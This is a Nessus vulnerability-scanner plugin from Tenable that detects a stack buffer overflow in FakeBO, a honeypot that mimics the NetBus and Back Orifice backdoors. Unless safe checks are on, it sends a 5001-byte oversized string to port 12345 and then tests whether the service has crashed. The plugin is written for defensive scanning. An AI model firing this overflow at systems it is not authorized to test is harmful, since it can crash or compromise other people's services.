#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: this domain no longer exists)
#      Added link to the Bugtraq message archive
#


include("compat.inc");


if(description)
{
 script_id(10066);
 script_version ("$Revision: 1.23 $");
 script_xref(name:"OSVDB", value:"57");
 
 script_name(english:"FakeBO NetBus Handling Code Remote Overflow");
 script_summary(english:"Overflows FakeBO's buffers");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The remote honeypot service has a stack buffer overflow\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host appears to be running FakeBO, a service that mimics\n",
     "backdoors such as Back Orifice and NetBus, monitoring any login\n",
     "attempts.\n\n",
     "The version of FakeBO running on the remote host has a remote stack\n",
     "buffer overflow vulnerability.  A remote attacker could exploit this\n",
     "to crash the service, or execute arbitrary code."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/1999_1/0607.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Disable this service."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK); # mixed
 script_family(english:"Gain a shell remotely");

 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl");
 script_require_ports("Services/netbus", 12345);

 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/netbus");
if(!port)port = 12345;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 { 
  a = recv_line(socket:soc, length:1024);
  if("NetBus" >< a)
  { 
   if(safe_checks())
   {
    report = string(
      "\n",
      "*** Nessus detected this vulnerability solely by\n",
      "*** looking at the banner of the remote service.\n"
    );
    security_hole(port:port, extra:report);
    exit(0);
   }
   s = crap(5001);
   send(socket:soc, data:s);
   close(soc);
   
   flaw = 0;
   soc2 = open_sock_tcp(port);
   if(!soc2)flaw = 1;
   else
   {
    d = recv(socket:soc2, length:1024);
    if(!d)flaw = 1;
    close(soc2);
   }
   
   if(flaw)security_hole(port);
  }
 }
}
